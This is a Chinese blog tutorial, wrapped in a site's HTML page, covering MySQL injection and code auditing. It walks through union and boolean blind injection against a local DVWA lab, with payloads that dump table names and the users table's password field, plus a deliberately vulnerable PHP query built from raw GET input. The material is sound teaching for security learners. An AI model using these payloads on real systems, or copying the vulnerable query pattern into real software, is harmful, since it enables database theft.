@@ -1,0 +1,1347 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Ethan">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Ethan">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="一花一世界，一木一森林">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>SQL注入回顾篇(1) · fi3ework&#39;s Studio</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">fi3ework&#39;s Studio.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">SQL注入回顾篇(1)</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">fi3ework's Studio.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            SQL注入回顾篇(1)
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="web安全">web安全</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3k</span>阅读时长: <span class="post-count reading-time">12 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/03/01</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>忆往昔，峥嵘岁月稠！大学已经到了大三了，打了很多比赛，回顾还是挺欣慰！此系列来由是想留一点东西，把所学知识整理一下，同时也是受github上Micro8分享的启发，故想做一些工作，以留后人参考，历时两个星期，第一系列SQL注入回顾篇出炉！内容分四节发布，其中SQL注入代码审计为两节，WAF绕过总结为1节，SQLMAP使用总结为1节！此为SQL注入代码审计第一部分。欢迎各位斧正，交流！</p>
+<a id="more"></a>
+<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>SQL注入就是web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询攻击者可以通过构造不同的sql语句来实现对数据库的任意操作。</p>
+<p>Sql注入的产生需要满足以下两个条件：</p>
+<ol>
+<li><p>参数用户可控：前端传给后端的参数内容是用户可以控制的。</p>
+</li>
+<li><p>参数带入数据库查询：传入的参数拼接到sql语句中，且带入数据库查询。</p>
+</li>
+</ol>
+<p>当传入的参数ID为1’时，数据库执行的代码如下所示。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from users where id=<span class="number">1</span>’</span><br></pre></td></tr></table></figure>
+<p>这个语句不符合数据库语法规范，所以会报错。当传入的参数为and 1=1时，执行的sql语句如下所示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from users where id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>因为1=1为真，且where语句中的id=1也为真，所以页面会返回与id=1相同的结果。当传入的id参数为and 1=2时，此时sql语句恒为假，所以服务器会返回与id=1不同的结果</p>
+<p>在实际环境中，sql注入会导致数据库的数据泄露，在安全配置不当的情况下还可能会被攻击者拿到系统权限，进行文件的读写操作等。</p>
+<p>普通的注入审计，可以通过<code>$_GET</code>,<code>$_POST</code>等传参追踪数据库操作，也可以通过<code>select</code> , <code>delete</code> , <code>update</code>,<code>insert</code> 数据库操作语句反追踪传参。</p>
+<h4 id="Mysql注入相关知识点"><a href="#Mysql注入相关知识点" class="headerlink" title="Mysql注入相关知识点"></a>Mysql注入相关知识点</h4><ol>
+<li><p>在Mysql 5.0版本之后，Mysql默认在数据库中存放一个”<code>information_shcema</code>”的数据库，在该库中，读者需要记住三个表名，分别是<code>SCHEMATA</code>,<code>TABLES</code>和<code>COLUMNS</code>。分存储该用户创建的所有数据库的库名，库名和表名，库名和表名,字段名。</p>
+</li>
+<li><p>Limit的用法：使用格式为<code>limit m,n</code>,其中m是指记录开始的位置，从0开始，表示第一条记录：n是指取n条记录。例如limit 0,1表示从第一条记录开始，取一条记录。</p>
+</li>
+<li><p>需要记住的几个函数</p>
+</li>
+</ol>
+<ul>
+<li><p>database():当前网站使用的数据库。</p>
+</li>
+<li><p>version():当前MYSQL的版本。</p>
+</li>
+<li><p>user():当前MySQL的用户。</p>
+</li>
+</ul>
+<ol start="4">
+<li>注释符</li>
+</ol>
+<p>在MYSQL中，常见的注释符的表达式为：#或–空格或/**/，</p>
+<p>，//，– , –+,,%00,–a。</p>
+<ol start="5">
+<li><p>内联注释</p>
+<p>内联注释的形式：/<em>！code </em>/。内联注释可以用于整个SQL语句中用来执行我们的SQL语句，</p>
+<p>举个栗子:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Index.php?id=<span class="number">-15</span> <span class="comment">/*!UNION*/</span> <span class="comment">/*!SELECT*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>MYSQL对大小写不敏感，所以存在大小绕过。</p>
+</li>
+</ol>
+<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>按照注入方式方式分为以下几种：</p>
+<ol>
+<li>Union注入</li>
+<li>Boolean注入</li>
+<li>报错注入</li>
+<li>时间注入</li>
+<li>堆叠注入</li>
+<li>二次注入</li>
+<li>宽字节注入</li>
+<li>Cookie注入</li>
+<li>Base64注入</li>
+<li>XFF注入</li>
+</ol>
+<h4 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h4><p>注入测试地址<a href="http://192.168.23.134/union/union.php?id=1" target="_blank" rel="noopener">http://192.168.23.134/union/union.php?id=1</a></p>
+<p>访问该网站页面返回的结果如图所示<br><img src="https://img-blog.csdnimg.cn/20190228165019944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>在url后添加一个单引号，再次访问，如下图所示，页面返回的结果与id=1的结果不同。<br><img src="https://img-blog.csdnimg.cn/20190228165051375.jpg" alt="在这里插入图片描述"><br>访问id=1 and 1=1,由于and 1=1为真，所以页面应返回与id=1相同的结果,如图所示，访问id=1 and 1=2 由于and 1=2为假，所以页面应返回与id=1不同的结果，如图1.2所示。<br><img src="https://img-blog.csdnimg.cn/20190228165112185.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="图1.1"><br>注：这里的加号代替了空格(url编码)<br><img src="https://img-blog.csdnimg.cn/20190228165248805.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>                                                                  图1.2</p>
+<p>  因此可以得出此网站可能存在sql注入的结论，接着使用order by 1-99语句查询该数据表的字段数量，可以理解为order by=1-99，如访问id=1 order by 8 返回的是与id=1相同的结果，如图2.1所示。访问id=1 order by 9,返回的与id=1的结果不同，则字段数为8，如图2.2.<br><img src="https://img-blog.csdnimg.cn/20190228165808305.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>​                                                                                        图2.1</p>
+<p><img src="https://img-blog.csdnimg.cn/20190228165825473.jpg" alt="在这里插入图片描述"></p>
+<p>​                                                                                         图2.2</p>
+<p>  接下来使用union注入，且通过order by 查询结果，得字段数为8，所以union注入的语句如下所示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20190228165852264.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>  我们将id值设为-1，只让服务器返回union select的结果，因为数据库里没有id=-1的数据。如下图：<br><img src="https://img-blog.csdnimg.cn/2019022816591669.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>返回的结果是4，5，意味着在union select 1,2,3,4,5,6,7,8中，4和5的位置可以输入sql语句。接下来我们在        4的位置使用database()查询当前数据库名访问</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,database(),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span></span><br></pre></td></tr></table></figure>
+<p>页面成功返回数据信息，如图所示<br><img src="https://img-blog.csdnimg.cn/20190228165942636.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>得到数据库名后，接下来查询表名<br><img src="https://img-blog.csdnimg.cn/20190228170004606.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190228170022290.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>以此类推，可以查询所有的表名，这里我们用users表，查询字段名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.clumns where table_schema=’dvwa’ <span class="keyword">and</span> table_name=’users’ limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20190228170044324.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>可知第一个字段为user_id,以此类推用limit n,1查询出所有字段名</p>
+<p><img src="https://img-blog.csdnimg.cn/20190228170103732.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190228170117838.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>得出字段名后，我们还要dump出字段值以password字段为例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select password from dvwa.users limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20190228170130978.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>假如我们利用5显示位，可以将密码对应的姓名也打印出来</p>
+<p><img src="https://img-blog.csdnimg.cn/20190228170146468.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h4 id="Union注入代码分析"><a href="#Union注入代码分析" class="headerlink" title="Union注入代码分析"></a>Union注入代码分析</h4><p>​       在union注入页面中，程序获取GET参数ID，将ID拼接到SQL语句中，在数据库中查询参数ID对应的内容，然后将第一条查询结果中的username和address输出到页面上，由于是将数据输出到页面上的，所以可以利用union语句查询其他数据，代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$con=mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"dvwa"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_error()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"连接失败: "</span> . mysqli_connect_error();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">$result = mysqli_query($con,<span class="string">"select * from users where `user_id`="</span>.$id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>($row = mysqli_fetch_array($result))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $row[<span class="string">'user'</span>] . <span class="string">" "</span> . $row[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="Boolean注入"><a href="#Boolean注入" class="headerlink" title="Boolean注入"></a>Boolean注入</h4><p>注入测试地址：<a href="http://192.168.23.134/boolean/boolean.php?id=1" target="_blank" rel="noopener">http://192.168.23.134/boolean/boolean.php?id=1</a></p>
+<p>访问该网址页面返回yes，如图所示<br><img src="https://img-blog.csdnimg.cn/20190228170206530.jpg" alt="在这里插入图片描述"></p>
+<p>加上单引号后，页面返回no</p>
+<p><img src="https://img-blog.csdnimg.cn/20190228170225880.jpg" alt="在这里插入图片描述"></p>
+<p>虽然这里存在报错注入，但目前暂不考虑，输入其它的id值，只返回yes和no。由此可以判断，页面只返回yes和no，不返回数据库中的数据，所以此处不可union注入。此处利用Boolean注入。Boolean注入是指构造SQL判断语句，通过查看页面的返回结果来推测哪些sql判断条件是成立，以此获取数据库数据。我们先判断数据库名的长度。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘ <span class="keyword">and</span> length(database())&gt;=<span class="number">1</span>--+</span><br></pre></td></tr></table></figure>
+<p>​    有单引号，所以需要注释符来注释。1的位置上可以是任意数字，如‘ and length(database())&gt;=4–+和‘ and length(database())&gt;=5–+,判断数据库长度，如图所示<br><img src="https://img-blog.csdnimg.cn/20190228170245464.jpg" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190228170310735.jpg" alt="在这里插入图片描述"></p>
+<p>可以判断出数据库名长度为4。</p>
+<p>​    接着，使用逐字符判断的方式获取数据库库名。数据库库名的范围一般在a~z,0~9之内，可能还有一些特殊字符，这里的字符不区分大小写。逐字符判断的SQL语句为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘ <span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)=’d’--+</span><br></pre></td></tr></table></figure>
+<p>​    substr是截取的意思，其意思是截取database()的值，从第一个字符开始，每次只返回一个。</p>
+<p>​    substr的用法跟limit的有区别，需要注意。Limit是从0开始排序，而这里是从1开始排序。可以使用burp的爆破功能爆破其中的d值，如图所示，当值为d时页面返回yes，其它值返回no，因此判断数据库名第一位为d<br><img src="https://img-blog.csdnimg.cn/20190228170332739.jpg" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190228170358750.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190228170417105.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>逐字符爆破可以得出数据库名为dvwa。</p>
+<p>​    其实还可以使用ASCII码的字符进行查询，在mysql中ASCII转换的函数为ord，则可以进行逐字符爆破。ASCII码共有127个对应码，因此我们把burp的payload的范围设为0~127。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘ <span class="keyword">and</span> ord(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&gt;=<span class="number">100</span>--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20190228170435220.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>d的ascii对应的为100，所以第一个字符为d。</p>
+<p>接下来爆破表名，同样利用burp爆破。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘ <span class="keyword">and</span> substr((select table_name from information_schema.tables where table_schema=’dvwa’ limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=’u’--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20190228170500392.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>这里爆破出第二个表的第一个字符为u,以此类推，就可以查询出所有的表名与字段名。</p>
